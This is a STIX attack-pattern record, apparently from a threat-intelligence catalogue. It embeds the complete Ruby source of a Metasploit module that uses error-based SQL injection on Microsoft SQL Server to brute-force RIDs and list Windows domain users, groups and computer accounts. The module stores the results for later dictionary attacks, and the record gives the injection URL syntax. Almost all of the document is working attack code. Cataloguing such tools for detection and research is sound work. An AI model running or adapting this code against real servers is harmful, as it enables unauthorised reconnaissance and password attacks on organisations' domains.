{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--79ee7d9d-9a29-4534-a912-891ea6b661d9",
    "created": "2024-08-14T16:22:29.892526Z",
    "modified": "2024-08-14T16:22:29.89253Z",
    "name": "Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration",
    "description": " This module can be used to bruteforce RIDs associated with the domain of the SQL Server using the SUSER_SNAME function via Error Based SQL injection. This is similar to the smb_lookupsid module, but executed through SQL Server queries as any user with the PUBLIC role (everyone). Information that can be enumerated includes Windows domain users, groups and computer accounts.  Enumerated accounts can then be used in online dictionary attacks.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli.rb",
            "external_id": "mssql_enum_domain_accounts_sqli.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::MSSQL_SQLI\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration',\n      'Description' => %q{\n        This module can be used to bruteforce RIDs associated with the domain of the SQL Server\n        using the SUSER_SNAME function via Error Based SQL injection. This is similar to the\n        smb_lookupsid module, but executed through SQL Server queries as any user with the PUBLIC\n        role (everyone). Information that can be enumerated includes Windows domain users, groups,\n        and computer accounts.  Enumerated accounts can then be used in online dictionary attacks.\n        The syntax for injection URLs is: /testing.asp?id=1+and+1=[SQLi];--\n      },\n      'Author'         =>\n        [\n          'nullbind <scott.sutherland[at]netspi.com>',\n          'antti <antti.rantasaari[at]netspi.com>'\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  => [[ 'URL','https://docs.microsoft.com/en-us/sql/t-sql/functions/suser-sname-transact-sql']]\n      ))\n\n    register_options(\n    [\n      OptInt.new('START_RID', [true, 'RID to start fuzzing at.', 500]),\n      OptInt.new('END_RID', [true, 'RID to stop fuzzing at.', 3000])\n    ])\n  end\n\n  def run\n    print_status(\"Grabbing the SQL Server name and domain...\")\n    db_server_name = get_server_name\n    if db_server_name.nil?\n      print_error(\"Unable to grab the server name\")\n      return\n    else\n      print_good(\"Server name: #{db_server_name}\")\n    end\n\n    db_domain_name = get_domain_name\n    if db_domain_name.nil?\n      print_error(\"Unable to grab domain name\")\n      return\n    end\n\n    # Check if server is on a domain\n    if db_server_name == db_domain_name\n      print_error(\"The SQL Server does not appear to be part of a Windows domain\")\n      return\n    else\n      print_good(\"Domain name: #{db_domain_name}\")\n    end\n\n    print_status(\"Grabbing the SID for the domain...\")\n    windows_domain_sid = get_windows_domain_sid(db_domain_name)\n    if windows_domain_sid.nil?\n      print_error(\"Could not recover the SQL Server's domain sid.\")\n      return\n    else\n      print_good(\"Domain sid: #{windows_domain_sid}\")\n    end\n\n    # Get a list of windows users, groups, and computer accounts using SUSER_NAME()\n    total_rids = datastore['END_RID'] - datastore['START_RID']\n    print_status(\"Brute forcing #{total_rids} RIDs via SQL injection, be patient...\")\n    domain_users = get_win_domain_users(windows_domain_sid)\n    if domain_users.nil?\n      print_error(\"Sorry, no Windows domain accounts were found, or DC could not be contacted.\")\n      return\n    end\n\n    # Print number of objects found and write to a file\n    print_good(\"#{domain_users.length} user accounts, groups, and computer accounts were found.\")\n\n    # Create table for report\n    windows_domain_login_table = Rex::Text::Table.new(\n      'Header'  => 'Windows Domain Accounts',\n      'Ident'   => 1,\n      'Columns' => ['name']\n    )\n\n    # Add brute forced names to table\n    domain_users.each do |object_name|\n      windows_domain_login_table << [object_name]\n    end\n\n    print_line(windows_domain_login_table.to_s)\n\n    # Create output file\n    filename= \"#{datastore['RHOST']}-#{datastore['RPORT']}_windows_domain_accounts.csv\"\n    path = store_loot(\n      'mssql.domain.accounts',\n      'text/plain',\n      datastore['RHOST'],\n      windows_domain_login_table.to_csv,\n      filename,\n      'SQL Server query results'\n    )\n    print_status(\"Query results have been saved to: #{path}\")\n  end\n\n  # Get the server name\n  def get_server_name\n    clue_start = Rex::Text.rand_text_alpha(8 + rand(4))\n    clue_end = Rex::Text.rand_text_alpha(8 + rand(4))\n    sql = \"(select '#{clue_start}'+@@servername+'#{clue_end}')\"\n\n    result = mssql_query(sql)\n\n    if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/\n      instance_name = $1\n      sql_server_name = instance_name.split('\\\\')[0]\n    else\n      sql_server_name = nil\n    end\n\n    sql_server_name\n  end\n\n  # Get the domain name of the SQL Server\n  def get_domain_name\n    clue_start = Rex::Text.rand_text_alpha(8 + rand(4))\n    clue_end = Rex::Text.rand_text_alpha(8 + rand(4))\n    sql = \"(select '#{clue_start}'+DEFAULT_DOMAIN()+'#{clue_end}')\"\n\n    result = mssql_query(sql)\n\n    if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/\n      domain_name = $1\n    else\n      domain_name = nil\n    end\n\n    domain_name\n  end\n\n  # Get the SID for the domain\n  def get_windows_domain_sid(db_domain_name)\n    domain_group = \"#{db_domain_name}\\\\Domain Admins\"\n\n    clue_start = Rex::Text.rand_text_alpha(8)\n    clue_end = Rex::Text.rand_text_alpha(8)\n\n    sql = \"(select cast('#{clue_start}'+(select stuff(upper(sys.fn_varbintohexstr((SELECT SUSER_SID('#{domain_group}')))), 1, 2, ''))+'#{clue_end}' as int))\"\n\n    result = mssql_query(sql)\n\n    if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/\n      object_sid = $1\n      domain_sid = object_sid[0..47]\n      return nil if domain_sid.empty?\n    else\n      domain_sid = nil\n    end\n\n    domain_sid\n  end\n\n  # Get list of windows accounts, groups and computer accounts\n  def get_win_domain_users(domain_sid)\n    clue_start = Rex::Text.rand_text_alpha(8)\n    clue_end = Rex::Text.rand_text_alpha(8)\n\n    windows_logins = []\n\n    total_rids = datastore['END_RID'] - datastore['START_RID']\n    # Fuzz the principal_id parameter (RID in this case) passed to the SUSER_NAME function\n    (datastore['START_RID']..datastore['END_RID']).each do |principal_id|\n      rid_diff = principal_id - datastore['START_RID']\n      if principal_id % 100 == 0\n        print_status(\"#{rid_diff} of #{total_rids } RID queries complete\")\n      end\n\n       user_sid = build_user_sid(domain_sid, principal_id)\n\n      # Return if sid does not resolve correctly for a domain\n      if user_sid.length < 48\n        return nil\n      end\n\n      sql = \"(SELECT '#{clue_start}'+(SELECT SUSER_SNAME(#{user_sid}) as name)+'#{clue_end}')\"\n\n      result = mssql_query(sql)\n\n      if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/\n        windows_login = $1\n\n        unless windows_login.empty? || windows_logins.include?(windows_login)\n          windows_logins.push(windows_login)\n          print_good(\" #{windows_login}\")\n        end\n      end\n\n    end\n\n    windows_logins\n  end\n\n  def build_user_sid(domain_sid, rid)\n    # Convert number to hex and fix order\n    principal_id = \"%02X\" % rid\n    principal_id = principal_id.size.even? ? principal_id : \"0#{principal_id}\"\n    principal_id  = principal_id.scan(/(..)/).reverse.join\n    # Add padding\n    principal_id = principal_id.ljust(8, '0')\n\n    # Create full sid\n    \"0x#{domain_sid}#{principal_id}\"\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}